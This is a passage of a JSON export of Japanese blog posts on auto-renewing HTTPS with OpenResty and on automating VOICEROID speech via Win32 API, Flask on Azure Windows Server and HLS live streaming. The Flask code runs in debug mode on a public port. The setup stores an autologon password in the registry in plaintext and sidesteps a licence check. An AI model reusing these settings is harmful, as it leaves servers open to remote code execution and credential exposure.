nginxの設定\n\nlua-nginx-auto-ssl特有の設定をいろいろ入れないといけません。\n\n[lua-nginx-auto-ssl](https://github.com/GUI/lua-resty-auto-ssl)のドキュメントを読めば大体わかりますが、\nハマる可能性のあるポイントをいかにリストアップしておきます。\n\n- resolverを必ず設定する\n- ホスト毎に必ず`location /.well-known/acme-challenge/`の設定を入れる\n- `auto_ssl:set(\"allow_domain\", ...)`を必ず設定する\n\n全部設定したのがコレです。\n\nhttps://github.com/kaz/openresty-autossl-sample-setting\n\n## 動かす\n\n```sh\nsystemctl start nginx\nsystemctl enable nginx\n```\n\n初回アクセス時は、証明書の取得が完了するまでレスポンスが返ってこないので、ちょっと時間がかかります。\n途中で作った自己署名証明書が使われてしまう場合は、証明書の取得に失敗しています。\n`/var/log/nginx/error.log`にエラーメッセージが出力されているので、確認しましょう。\n\n# おわり\n\nこれで放っといても勝手に証明書を更新してくれたり、nginxの設定をコピーすれば新しいホストに対して証明書を発行してくれる環境ができました！\nlua-nginx-auto-sslを導入したので、このブログもSSL化してみました。\n\n## 余談\n\nLet's Encryptでワイルドカード証明書が発行できるようになるそうです。すごい。\n\nhttps://twitter.com/letsencrypt/status/882985570401701888\n\n## 追記\n\nワイルドカード証明書が発行できるようになりました。\n\n[ワイルドカード証明書](/posts/23/)\n","title":"lua-nginx-auto-sslで全自動HTTPS","image":null,"tags":["インフラ","自動化","SSL","nginx","lua","OpenResty"],"date":"2017-07-08T00:00:00.000Z","updated":"2021-01-08T10:53:56.000Z"},{"type":"article","slug":"18","body":"Win32APIでVOICEROIDをいじってみます\n\n\n# 東北きりたん\n\n[VOICEROID+ 東北きりたん EX](http://www.ah-soft.com/voiceroid/kiritan/)を買いました。\n\nhttp://www.ah-soft.com/voiceroid/kiritan/\n\n![](kiritan.png)\n\nう～～～～んかわいい！！！\nかわいいです。\n\n声もしっとりしていて完全にボク好みです。最高。\n\n# クラウドきりたん\n\nいろいろ使いみちが思いつくんですが、**Windowsでしか動かない**のがネックです……\n\nHTTPでテキストをぶん投げたら音声が飛んでくる感じになったら色々幸せじゃないですか。\nということで作っていきたいと思います。\n\n## Linuxで動かないかな？\n\nLinuxで動かすとすれば、Wineですね。\n\n[Linux の Docker の中で voiceroid+ ゆかりさんを動かす](http://pushl.net/blog/12/)という記事を見つけました。\nどうやらWineで動くみたい？しかもDockerの中で。すごい！\n\nhttp://pushl.net/blog/12/\n\n試してみたんですが、うまくいきませんでした＞＜\n**VOICEROID+ EX**になってからいろいろ変わったんでしょうか。\n\n自分でもWine環境を作って試してみたんですが、 .NET Framework 3.5のインストールがうまく行かず失敗。\n\nということでWineは諦めます。\n\n## WindowsServerで動かないかな？\n\n動作環境には当然乗っていませんが、Windows Server 2016で適当に試してみたら普通に動きました。\n\nですが、VOICEROIDにはGUIしかありません。\nCUIから操作できれば全て解決なんですが、用意されてません。かなしい。\n\nということで、Win32APIを叩いて自作プログラムからVOICEROIDの機能を使えるようにしてみましょう。\nとはいっても、GUIを無理やり操作して動かすだけです。\n筋肉ソリューション感が否めませんが、仕方がないです。\n\n# Win32APIを叩いてVOICEROIDを操作\n\nこのテの話は、「ウィンドウ 操作 Win32API」とかでググると無限に見つかるかと思うので、ザックリとだけ説明します。\n\n`SendMessage`関数を使うとユーザのマウス操作やキーボード操作がエミュレートできるので、\nうまい感じにテキストを入力させて保存ボタンを押させてあげれば、読み上げたwavファイルを得ることができそうです。\n\n## やりました\n\n方針が定まったら書くだけ……\nPythonで書いてみました。\n\nffmpegを使っているので、別途用意が必要です。\n必要なPythonのライブラリは`pypiwin32`です\n\n```sh\npip install pypiwin32\n```\n\n### コード\n\nhttps://github.com/kaz/kiritan-server/blob/aa4c4e4ed39bb024fb50f5392c8375dc4f4fa448/talk.py\n\n```python\n# coding: UTF-8\n\nimport os\nimport sys\nimport time\nimport hashlib\nimport threading\nimport subprocess\n\nfrom win32con import *\nfrom win32gui import *\nfrom win32process import *\n\n# 共通設定\nwaitSec = 0.5\nwindowName = \"VOICEROID＋ 東北きりたん EX\"\n\ndef talk(inputText):\n\t# 出力先ディレクトリ作成\n\toutdir = \"./output/\"\n\ttry:\n\t\tos.mkdir(outdir)\n\texcept:\n\t\tpass\n\n\t# ファイルが存在してたらやめる\n\toutfile = outdir + hashlib.md5(inputText.encode(\"utf-8\")).hexdigest() + \".mp3\"\n\tif os.path.exists(outfile):\n\t\treturn outfile\n\n\t# 一時ファイルが存在している間は待つ\n\ttmpfile = \"tmp.wav\"\n\twhile True:\n\t\tif os.path.exists(outfile):\n\t\t\ttime.sleep(waitSec)\n\t\telse:\n\t\t\tbreak\n\n\twhile True:\n\t\t# VOICEROIDプロセスを探す\n\t\twindow = FindWindow(None, windowName) or FindWindow(None, windowName + \"*\")\n\n\t\t# 見つからなかったらVOICEROIDを起動\n\t\tif window == 0:\n\t\t\tsubprocess.Popen([\"C:\\Program Files (x86)\\AHS\\VOICEROID+\\KiritanEX\\VOICEROID.exe\"])\n\t\t\ttime.sleep(3 * waitSec)\n\t\telse:\n\t\t\tbreak\n\n\twhile True:\n\t\t# ダイアログが出ていたら閉じる\n\t\terrorDialog = FindWindow(None, \"エラー\") or FindWindow(None, \"注意\") or FindWindow(None, \"音声ファイルの保存\")\n\t\tif errorDialog:\n\t\t\tSendMessage(errorDialog, WM_CLOSE, 0, 0)\n\t\t\ttime.sleep(waitSec)\n\t\telse:\n\t\t\tbreak\n\n\t# 最前列に持ってくる\n\tSetWindowPos(window, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW | SWP_NOMOVE | SWP_NOSIZE)\n\n\t# 保存ダイアログの操作\n\tdef enumDialogCallback(hwnd, param):\n\t\tclassName = GetClassName(hwnd)\n\t\twinText = GetWindowText(hwnd)\n\n\t\t# ファイル名を設定\n\t\tif className.count(\"Edit\"):\n\t\t\tSendMessage(hwnd, WM_SETTEXT, 0, tmpfile)\n\n\t\t# 保存する\n\t\tif winText.count(\"保存\"):\n\t\t\tSendMessage(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, 0)\n\t\t\tSendMessage(hwnd, WM_LBUTTONUP, 0, 0)\n\n\t# 音声の保存\n\tdef save():\n\t\ttime.sleep(waitSec)\n\n\t\t# ダイアログがあれば操作する\n\t\tdialog = FindWindow(None, \"音声ファイルの保存\")\n\t\tif dialog:\n\t\t\tEnumChildWindows(dialog, enumDialogCallback, None)\n\t\t\treturn\n\n\t\t# 再試行\n\t\tsave()\n\n\t# VOICEROIDを操作\n\tdef enumCallback(hwnd, param):\n\t\tclassName = GetClassName(hwnd)\n\t\twinText = GetWindowText(hwnd)\n\n\t\t# テキストを入力する\n\t\tif className.count(\"RichEdit20W\"):\n\t\t\tSendMessage(hwnd, WM_SETTEXT, 0, inputText)\n\n\t\tif winText.count(\"音声保存\"):\n\t\t\t# 最小化解除\n\t\t\tShowWindow(window, SW_SHOWNORMAL)\n\n\t\t\t# 保存ダイアログ操作用スレッド起動\n\t\t\tthreading.Thread(target=save).start()\n\n\t\t\t# 保存ボタンを押す\n\t\t\tSendMessage(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, 0)\n\t\t\tSendMessage(hwnd, WM_LBUTTONUP, 0, 0)\n\n\t# VOICEROIDにテキストを読ませる\n\tEnumChildWindows(window, enumCallback, None)\n\n\t# プログレスダイアログが表示されている間は待つ\n\twhile True:\n\t\tif FindWindow(None, \"音声保存\"):\n\t\t\ttime.sleep(waitSec)\n\t\telse:\n\t\t\tbreak\n\n\t# MP3に変換\n\tsubprocess.run([\"ffmpeg\", \"-i\", tmpfile, \"-acodec\", \"libmp3lame\", \"-ab\", \"128k\", \"-ac\", \"2\", \"-ar\", \"44100\", outfile])\n\n\t# 一時ファイルが存在していたら消す\n\ttry:\n\t\tos.remove(tmpfile)\n\t\tos.remove(tmpfile.replace(\"wav\", \"txt\"))\n\texcept:\n\t\tpass\n\n\treturn outfile\n\nprint(talk(sys.argv[1]))\n```\n\n## 注意\n\n一度適当なテキストを読み上げさせ、スクリプトを実行するディレクトリに保存させておく必要があります。\n保存先ダイアログを操作するときに、保存先ディレクトリを変更せずに保存させるため、\nスクリプトの実行ディレクトリと同じところがデフォルトになっていないと以後の処理が失敗します。\n\n手抜きです……\n\n## ハマりそうなポイント\n\n- ところどころにsleepを入れないと操作が失敗することがある\n- フォーカスが当たってないとか最小化されてるとかでボタン操作に失敗することがある\n- 出力が終わってない状況で新しい読み上げをさせようとすると死ぬ\n\t- 今回は前のが終わるまでブロックするようにした\n- Windowsのバージョンが違うと保存ウィンドウが違う気がするので上手く行かないかも\n\t- 今回はWindowsServer2016(Windows 10)です\n- 同じテキストの繰り返しを投げるとVOICEROIDがエラーを吐く\n\t- よくわからん\n\n# 次回予告\n\nということで、Pythonから好きなテキストをVOICEROIDに送って読み上げたWAVを得ることができるようになりました。\nコレだけでもうだいぶ夢が広がるカンジですね！！\n\n次回は、コイツをクラウドで動かしていつでもどこでもきりたんボイスが作れる環境を作ります。\n\n[クラウド東北きりたん その2 ～AzureのWindowsServerでVOICEROIDを動かす～](/posts/19/)\n","title":"クラウド東北きりたん その1 ～Win32APIでVOICEROIDを操作～","image":null,"tags":["VOICEROID","東北きりたん","Win32API","Python"],"date":"2017-05-25T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"19","body":"AzureのWindowsServerでVOICEROIDを動かします\n\n[前回](/posts/18/)の続きです。\n\n# あらすじ\n\n前回はPythonからWin32APIをバシバシ叩いてきりたん好きなコトを喋らせることができるようになったのでした。\n\n[クラウド東北きりたん その1 ～Win32APIでVOICEROIDを操作～](/posts/18/)\n\n今回は、クラウドサービス上（というか適当なサーバ）できりたんに働いてもらおうと思います。\n\n![](kiritan.png)\n\n# Microsoft Azure\n\nMicrosoft AzureのVirtual Machinesでは、WindowsServerのインスタンスを立ち上げることが出来ます。\nそのへんのWindows VPSサービスを比べるとちょっと割高な感じはします。（それはそう）\n\nなんかAzureではWindows Client（普通のWindows 10とか）も使えるっぽいんですが、\nMSDNサブスクリプションが必要とかでアレなので、今回はWindowsServerで行きます。\n\nぶっちゃけKVMベースのVPSサービスならWindowsが普通にインストールできるような気がしますが、\n契約関係で怖い人から怒られるので避けるのが無難です。\n\n~~学生なら、Microsoft Imagine(旧Dreamspark)からWindows Sever 2016のライセンスがタダでもらえるので、コレを使って自宅鯖を建てるのもアリかと思います。~~[^imagine]\n\n[^imagine]: Microsoft Imagineは終了したらしいです。\n\n## インスタンス作成\n\nAzure Portalから適当にインスタンスを作ります。\nインスタンスのサイズですが、メモリ0.75GBだとかなり厳しさがあるので1.75GBが最低ラインな感じがあります。\n\nあと、デフォルトだと鬼高いサイズしか表示されなくて焦るんですが、\n**サポートされるディスクの種類**を**SSD**にして、**全て表示**を押すとお手頃サイズが出てきます。\n\n![](1.png)\n\nボクは無料試用クレジットを使い切るために強めのインスタンスを建てました。\n\nインスタンスを作成したときに勝手に**ネットワークセキュリティグループ**というリソースが作成されており、\nこの設定を変えてポートを開けないとリモートデスクトップ接続(RDP)ができません。\n\n対象のネットワークセキュリティグループを開いて、**受信セキュリティ規則 → 追加**で設定画面を開き、\nサービスから**RDP**を選択して許可します。\n\n![](2.png)\n![](3.png)\n\nこのあとHTTPも使うので、ついでにHTTPを許可する設定も追加しておきましょう。\n先程と同様にして設定画面を開き、サービスから**HTTP**を選択して許可します。\n\n# サーバ設定\n\nWindowsServerを使う場合は、いろいろ設定が必要になります。\n普通のWindowsを使う場合は不要なものも多いので、軽く目を通す程度で。\n\n## RDP\n\nリモートデスクトップ接続(RDP)を使ったほうが色々便利なので、そうします。\nAzureだと、勝手にONになっているのでこの設定は不要です。\n\nサーバマネージャを起動して、**ローカルサーバ → リモートデスクトップ → このコンピュータへのリモート接続を許可する**にチェックを入れてOKを押します。\n\n![](4.png)\n\n## .NET Framework\n\n普通のWindowsだと必要になったときにダイアログが出てきて簡単にインストールできますが、\nWindowsServerだとそうはいきません。\n\nサーバマネージャを起動して、**管理 → 役割と機能の追加 → .NET Framework 3.5 Features**にチェックを入れてインストールします。\n\n![](5.png)\n\n## ファイアウォール\n\nこのあとHTTPをきりたんと通信するインタフェースとして使うので、`80/tcp`を開放します。\n\nサーバマネージャを起動して、**ローカルサーバ → Windowsファイアウォール → 詳細設定 → 受信の規則 → 新しい規則**\nで出てくるダイアログに従って、80番ポートを開放します。\n\n![](6.png)\n\n## IEの制限解除\n\nWindowsServerではデフォルトでIEが機能制限されているので、解除します。\nこの後Pythonをインストールしたりするときに問題があるためです。\n\nサーバマネージャを起動して、**ローカルサーバ → IEセキュティ強化の構成 → Administratorsグループ → オフ**にチェックを入れてOKを押します。\n今回はいろいろラクをするためにAdministratorで進めていきますが、一般ユーザで行う場合はUsersグループのセキュティ強化の構成をオフにしてください。\n\n![](7.png)\n\n# VOICEROIDのインストール\n\n普通にインストーラからインストールできます。\n1ライセンスで1PCにしかインストール出来ないので、注意しましょう。\n\n## ライセンス認証\n\nサーバ起動後、一度でもRDPで接続していると**ライセンス認証に失敗**するようになります。\n多分、ライセンス認証ドライバ（Sentinel LDK License Manager）がRDPを検知して爆発してるからです。\nRDPで繋ぐような環境で使うな！！！ってことっぽいのでちょっとグレーかもしれません……\n\n回避策として、RDPで繋ぐ前にきりたんを起動してしまいます。\n\n- 起動時に自動ログインさせる\n- ログイン時にきりたんを自動起動する\n\n`HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`に以下の3つのキーを作成します。\n\n- AutoAdminLogon\n\t- DWORDで値は`1`\n- DefaultUserName\n\t- ログインするユーザ名\n- DefaultPassword\n\t- ログインユーザのパスワード\n\n![](8.png)\n\nこれで、起動時に勝手にログインするようになります。\n\n次に、スタートメニューを出して`gpedit.msc`を入力してエンターし、\n**ユーザの構成 → Windowsの設定 → スクリプト → ログオン**を開き、\nVOICEROIDのEXEファイルを指定します。\n\n![](9.png)\n\nこれで、ログイン後に自動でVOICEROIDが起動します。\n\nこれによって、サーバ起動時に勝手にログインしてきりたんが立ち上がります。\nかなり筋肉ソリューション感が強いですが、仕方がない＞＜\n\n## 起動時のエラー\n\nAzure上だとサウンドデバイスがないので、起動時にエラーが表示され、再生ボタンが押せなくなります。\n音声保存はできるので、今回は問題ありません。\n\n# PythonでVOICEROIDをサーバ化\n\n[前回](/posts/18/)PythonからVOICEROIDを操作できるようになったので、\nあとはHTTPからリクエストを受けて音声ファイルを返すようにするだけです。\n\nサーバへPythonとFFMPEGをインストールしておきましょう。\nGUIがあるので普通にやるだけです。かんたん。\n\n## やりました\n\n方針が定まったら書くだけ……\nflaskを使って書きました。\n\nVOICEROID操作のコードは[前回](/posts/18/)の記事を参照してください。\n\nffmpegを使っているので、別途用意が必要です。\n必要なPythonのライブラリは`pypiwin32`と`flask`です\n\n```sh\npip install pypiwin32 flask\n```\n\n### コード\n\nhttps://github.com/kaz/kiritan-server/blob/aa4c4e4ed39bb024fb50f5392c8375dc4f4fa448/server.py\n\n```python\n# coding: UTF-8\n\nimport flask\nimport subprocess\n\napp = flask.Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef get():\n\tr = flask.request\n\ttext = r.form['text'] if r.method == \"POST\" else r.args.get('text', None)\n\n\tif text == None:\n\t\treturn 'plz specify `text`'\n\n\tcompleted = subprocess.run(\n\t\t['python', 'talk.py', text],\n\t\tencoding='ascii',\n\t\tstdout=subprocess.PIPE,\n\t\ttimeout=30\n\t)\n\n\treturn flask.send_from_directory('./', completed.stdout.strip())\n\nif __name__ == '__main__':\n\tapp.debug = True\n\tapp.run(host='0.0.0.0', port=80)\n```\n\n## 注意\n\n一度適当なテキストを読み上げさせ、スクリプトを実行するディレクトリに保存させておく必要があります。\n保存先ダイアログを操作するときに、保存先ディレクトリを変更せずに保存させるため、\nスクリプトの実行ディレクトリと同じところがデフォルトになっていないと以後の処理が失敗します。\n\n手抜きです……\n\n# 次回予告\n\nということで、HTTPで好きなテキストをVOICEROIDに送って読み上げたWAVを得ることができるようになりました。\nコレでブラウザさえあればきりたんボイスが聴けてしまうわけです。ああ＾～きりたんかわいい！！！！\n\n次回は、コイツを更に改造してきりたんボイスをライブストリーミングしてみる実験です。\n\n[クラウド東北きりたん その3 ～HLSでライブストリーミング～](/posts/20/)\n","title":"クラウド東北きりたん その2 ～AzureのWindowsServerでVOICEROIDを動かす～","image":null,"tags":["VOICEROID","東北きりたん","クラウド","Azure","WindowsServer"],"date":"2017-05-25T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"20","body":"HLSを使ったライブストリーミングを試してみます\n\n[前々回](/posts/18/)・[前回](/posts/19/)の続きです。\n\n<!--more-->\n\n# あらすじ\n\n前々回はPythonからWin32APIをバシバシ叩いてきりたん好きなコトを喋らせることができるようになったのでした。\n\n[クラウド東北きりたん その1 ～Win32APIでVOICEROIDを操作～](/posts/18/)\n\n前回はAzureのWindowsServerにHTTPリクエストを送ってきりたん好きなコトを喋らせるサーバができたのでした。\n\n[クラウド東北きりたん その2 ～AzureのWindowsServerでVOICEROIDを動かす～](/posts/19/)\n\n今回は、**HTTP Live Streaming**(HLS)を用いてきりたんボイスをライブ配信してみようと思います！\n\n![](kiritan.png)\n\n# HTTP Live Streaming\n\n**HTTP Live Streaming**とは、Appleが開発したHTTPベースのストリーミング配信プロトコルです。\n静的な動画ファイルのストリーミング配信はもちろん、ライブ配信(生放送)もできたり、\nアダプティブストリーミングと呼ばれる回線速度に応じて配信するビットレートを変更する技術も利用可能です。\n\n最近話題の[AbemaTV](https://abema.tv/)なんかでも、HLSで配信を行っています。\nちなみに、Twitterにアップされた動画もHLSで配信されています。\n\nストリーミング配信プロトコルと聞くと、複雑そうな気がしてきますが、HLSはHTTPベースで非常に単純です。\nザックリと説明を書いてみます。\n\n## HLSのしくみ\n\nHLSでの配信は、`.ts`ファイルと`.m3u8`ファイルによって行われます。\n\n### ts\n\n`.ts`ファイルは、**MPEG-2 TS**と呼ばれる形式で、配信される映像・音声そのものが格納されます。\n\n配信されるデータは一定の秒数ごとに分割し、このMPEG-2 TS形式で保存しておきます。\n分割された`.ts`ファイルは、HTTPでダウンロードできるようにしておきます。\n\nちなみに、日本のデジタルテレビ放送もこのMPEG-2 TSで配信されています。\n\n### m3u8\n\n`.m3u8`ファイルは、配信ファイルのインデックスです。\n先述した`.ts`に分割された映像・音声データのURLが列記されています。\n\nAbemaTVから配信されている`.m3u8`の例\n```\n#EXTM3U\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=300000\n240/playlist.m3u8?t=3i87VhR5nuXMsjxJRGBiEYSNPdfggGQtr9LjXNx1fr5Dufac7cEaEKMyo2UAv77B63hAvVewach5eaPjFGK3EU22fcpcFD4RAeNAE7nisDwZguUqvp&mq=720&lanceId=c99528aa-0c3c-4987-ab6c-ce5cd1430223\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=900000\n360/playlist.m3u8?t=3i87VhR5nuXMsjxJRGBiEYSNPdfggGQtr9LjXNx1fr5Dufac7cEaEKMyo2UAv77B63hAvVewach5eaPjFGK3EU22fcpcFD4RAeNAE7nisDwZguUqvp&mq=720&lanceId=c99528aa-0c3c-4987-ab6c-ce5cd1430223\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1400000\n480/playlist.m3u8?t=3i87VhR5nuXMsjxJRGBiEYSNPdfggGQtr9LjXNx1fr5Dufac7cEaEKMyo2UAv77B63hAvVewach5eaPjFGK3EU22fcpcFD4RAeNAE7nisDwZguUqvp&mq=720&lanceId=c99528aa-0c3c-4987-ab6c-ce5cd1430223\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=2200000\n720/playlist.m3u8?t=3i87VhR5nuXMsjxJRGBiEYSNPdfggGQtr9LjXNx1fr5Dufac7cEaEKMyo2UAv77B63hAvVewach5eaPjFGK3EU22fcpcFD4RAeNAE7nisDwZguUqvp&mq=720&lanceId=c99528aa-0c3c-4987-ab6c-ce5cd1430223\n```\n\nこれはMaster Playlistと呼ばれるデータで、\n回線速度によって異なるビットレートでの配信を行うアダプティブストリーミングのためのファイルです。\n次に示すMedia PlaylistのURLと想定する回線速度が列記されています。\n\nAbemaTVから配信されている`.m3u8`の例\n```\n#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:6\n#EXT-X-MEDIA-SEQUENCE:4\n#EXT-X-DISCONTINUITY-SEQUENCE:1\n#EXT-X-KEY:METHOD=AES-128,URI=\"abematv://v2/abema-news/abema-news/DUjoiyL1pJGkADZotyiXDn5\",IV=0xaccca4b41de3d9afb029070eb564be40\n#EXTINF:5.005000,\nhttps://abematv.akamaized.net/tsnews/abema-news/h264/720/5BPWe1D8Hu9yCC8HaA3oHS.ts\n#EXTINF:5.005000,\nhttps://abematv.akamaized.net/tsnews/abema-news/h264/720/5SphyMY1TTLvYkFo7B5JuM.ts\n#EXTINF:5.005000,\nhttps://abematv.akamaized.net/tsnews/abema-news/h264/720/2kxyGFo9sH9zUUfKj5USUk.ts\n#EXTINF:5.005000,\nhttps://abematv.akamaized.net/tsnews/abema-news/h264/720/Cz43TVWLgUgqskzvWBBnjA.ts\n```\n\nこれはMedia Playlistと呼ばれるデータで、\n配信されている映像・音声が格納された`.ts`ファイルのURLが列記されています。\n\n### 再生の方法\n\nクライアントは、まず`.m3u8`ファイルを取得します。\nそれがMaster Playlistであれば、回線速度によって適切な`.m3u8`を読みに行きます。\nそれがMedia Playlistであれば、`.ts`ファイルを取得して再生します。\n\nクライアントは、`.m3u8`内のタグと呼ばれるデータ(`#EXT`で始まる行)に従って、`.m3u8`を再読込します。\nライブ配信を行う場合は、クライアントが再読込した際に新しい配信データが追加されていれば良いわけです。\n\n以下に、主要なタグの説明を示します。\n\n#### EXT-X-TARGETDURATION\n\n分割された`.ts`の中で最大の長さに最も近い整数値を指定します。\nクライアントは、およそこの秒数ごとに`.m3u8`を再読込します。\n\nhttps://tools.ietf.org/html/draft-pantos-http-live-streaming-23#section-4.3.3.1\n\n#### EXT-X-MEDIA-SEQUENCE\n\nその`.m3u8`にかかれている一番最初の`.ts`が、放送全体で何番目の`.ts`であるかの値を指定します。\nクライアントが分割された`.ts`を正しく連続再生する上で必要になります。\n\nhttps://tools.ietf.org/html/draft-pantos-http-live-streaming-23#section-4.3.3.2\n\n#### EXTINF\n\n分割された`.ts`１つの秒数。小数で指定できる。\n\nhttps://tools.ietf.org/html/draft-pantos-http-live-streaming-23#section-4.3.2.1\n\n# HLSを再生したい\n\nHLSはブラウザ上で再生できるのが強いです。\nhttps://caniuse.com/#search=HLS\n\nん？？？？？なんか赤いな……\n\n![](hls.png)\n\nFirefoxとChromeが対応してないやんけ！！！！！！！！！\n珍しくEdgeが優秀だ……\n\n悲しいですね。\nでも**Mesia Source Extensions**(MSE)という機能を使うとそれっぽくHLSを再生できるので安心です。\nhttps://caniuse.com/#search=MSE\n\nMSEを使ったHLS再生は、[Video.js](http://videojs.com/)とか[hls.js](https://github.com/video-dev/hls.js/tree/master)とかのライブラリを使うと簡単です。\n\nちなみに、AbemaTVは[THEOplayer](https://www.theoplayer.com/)という有償のプレーヤーを使ってるみたい。\n\n# HLSで生配信\n\nHLSをなんとな～くわかった気になったので、ライブ配信をやってみます。\n\nHLSで生配信をするにはどうすればよいのかというと、つまり\n\n- データをMPEG-2 TSにエンコードする\n- `.m3u8`に`.ts`へのリンクを追加する\n\nを繰り返すだけです。\n\n`.ts`へのを追加していくだけだとドンドン`.m3u8`がでっかくなってしまうので、\n過去の`.ts`へのリンクはある程度時間が立ったら消してしまいましょう。\n`.ts`へのリンクを消したら、`#EXT-X-MEDIA-SEQUENCE`を増やさないとクライアントが困ってしまうので注意です。\n\nとっても単純ですね！\nさて、先述したことをやるだけでライブ配信サーバが書けてしまいます。\n\n今回は、Twitterからタイムラインを取得して、ツイートをいい感じにきりたんに読んでもらい、\nHLSを用いてリアルタイムでその音声データを配信してみます。\n\n音声ファイルを分割してMPEG-2 TSにするのを自分で書くのは流石にしんどいので、\nFFMPEGさんにお願いしました。\nhttps://www.ffmpeg.org/ffmpeg-formats.html#hls-1\n\n## やること\n\n![](system.svg)\n\n### twitter.listen()\n\n- UserStreamでツイート取得\n- kiritan.pyにジョブを投げる\n- encoder.pyのキューに読み上げたWAVファイルを蓄積\n\n### encoder.livestreaming()\n\n- キューにファイルがなければ無音データをプレイリストに追加\n- キューにファイルがあればTSに分割してプレイリストに追加\n- プレイリストの先頭のTSの再生時間分だけ待って、プレイリストから削除\n\n## やりました\n\n方針が定まったら書くだけ……\n\n### コード\n\n全コード\n\nhttps://github.com/kaz/kiritan-server\n\nHLS関係の処理はたったコレだけです！\n```python\n# FFMPEGでファイルをMPEG-TSにエンコード（中身はMP3）\ndef ts(file):\n\tlogging.info(\"Encoding WAV to MPEG-TS\")\n\n\tdata = subprocess.run(\n\t\t[\n\t\t\t\"ffmpeg\",\n\t\t\t\"-i\", file, \"-vn\",\n\t\t\t\"-acodec\", \"libmp3lame\",\n\t\t\t\"-ab\", \"128k\",\n\t\t\t\"-ac\", \"2\",\n\t\t\t\"-ar\", \"44100\",\n\t\t\t\"-f\", \"hls\",\n\t\t\t\"-hls_time\", \"2\",\n\t\t\t\"-hls_list_size\", \"0\",\n\t\t\t\"-start_number\", str(int(time.time() * 1000)),\n\t\t\t\"-hls_segment_filename\", \"static/live%d.ts\",\n\t\t\t\"pipe:1.m3u8\"\n\t\t],\n\t\tstdout=subprocess.PIPE,\n\t\tstderr=subprocess.DEVNULL\n\t)\n\n\t# 出力されたプレイリストをパースして返す\n\tplaylist = data.stdout.decode(\"utf-8\")\n\tplaylist = playlist[playlist.rfind(\"#EXTM3U\"):]\n\n\t# Tuple (再生時間, ファイルパス)\n\treturn re.findall(r\"#EXTINF:([\\d.]+),\\s+(\\S+)\", playlist)\n\n# ライブストリーミングキューに追加\nque = []\ndef enqueue(f):\n\tque.append(f)\n\n# ライブプレイリストを更新\ntsl = []\nseq = 0\ndef __livecasting():\n\tglobal seq\n\n\twhile True:\n\t\ttry:\n\t\t\tif len(que) != 0:\n\t\t\t\t# キューにデータがあればプレイリストに追加\n\t\t\t\ttsl.extend(ts(que.pop(0)))\n\t\t\telse:\n\t\t\t\t# キューが空なら無音ファイルを配信\n\t\t\t\twhile len(tsl) < 3:\n\t\t\t\t\ttsl.append((\"2.04\", \"silent.ts\"))\n\n\t\t\t# TS 1つ分だけ休憩する\n\t\t\ttime.sleep(float(tsl[0][0]))\n\t\t\ttsl.pop(0)\n\t\t\tseq += 1\n\t\texcept:\n\t\t\tlogging.error(traceback.format_exc())\n\n# サーバ起動\ndef livecasting():\n\t# 古い配信データを削除\n\tfor f in glob.glob(\"static/live*\"):\n\t\tos.remove(f)\n\n\tthreading.Thread(target=__livecasting).start()\n\n# ライブプレイリストを生成\ndef playlist():\n\tpl = [\n\t\t\"#EXTM3U\",\n\t\t\"#EXT-X-VERSION:3\",\n\t\t\"#EXT-X-TARGETDURATION:3\",\n\t\t\"#EXT-X-MEDIA-SEQUENCE:%d\" % seq\n\t]\n\n\tfor ts in tsl[:5]:\n\t\tpl.append(\"#EXTINF:%s,\" % ts[0])\n\t\tpl.append(\"#EXT-X-DISCONTINUITY\")\n\t\tpl.append(\"/static/%s\" % ts[1])\n\n\treturn \"\\n\".join(pl)\n```\n\nffmpegを使っているので、別途用意が必要です。\n必要なPythonのライブラリは`pypiwin32`と`flask`と`tweepy`です\n\n```sh\npip install pypiwin32 flask tweepy\n```\n\n## 動作検証\n\n大体のブラウザでhls.jsを介した再生ができました。\n\nネイティブでHLSに対応しているブラウザ(Safari, Edge, iOS Safari, Android Chrome)は、\n`.m3u8`に直接アクセスしても再生できました。\n\nなんかAndroidだとちょっとプツプツしちゃってるかも？？？\n\n## ハマりそうなポイント\n\n- TS1つの長さ、プレイリスト全体の長さ、`#EXT-X-TARGETDURATION`をうまく調整しないと再生されなかったりプツプツなったりする\n\t- このへんどうするのが最適なのかがわからないので今回は試行錯誤した\n- TSが切り替わる（別のメディアから生成したものになる）時に`#EXT-X-DISCONTINUITY`を付けないと再生が止まる\n\t- Appleのソフトウェアはうまくやってくれるけど、その他は上手く行かない\n- TwitterのUserStreamはPCの時計かズレてると認証失敗する\n\n# おしまい\n\nということで、AzureのWindowsServerでWin32APIを使ってVOICEROIDを操作してTwitterのTLを読み上げた音声をHLSでライブ配信できました！\n\nWin32APIとかHLSとか、まだわからないことがたくさんなので、それはおかしいだろ！って思ったら鉞おねがいします＞＜\n\nそれにしても、きりたんはかわいいですね！\n\nおしまい\n","title":"クラウド東北きりたん その3 ～HLSでライブストリーミング～","image":null,"tags":["VOICEROID","東北きりたん","インフラ","HLS","ストリーミング"],"date":"2017-05-25T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"17","body":"重い\n\n\n# CPCTF\n\nhttps://ctf-no.pro/\n\nこういうのをやりました。\n\n出題された問題の雰囲気はこういうかんじ（参加してくださった方のwriteupです）\n\nhttp://yuinore.net/2017/04/cpctf-writeup-1/\n\nhttp://yuinore.net/2017/04/cpctf-writeup-2/\n\nサーバ周りは全てボクが担当したんですが、ゴミクソ重くて申し訳なさがXDです。\n\n## 構成\n\n問題が60個とかそれくらいありました。多すぎる。\nで、この問題たちとスコアサーバを全て1台のサーバ(cpu:8Core 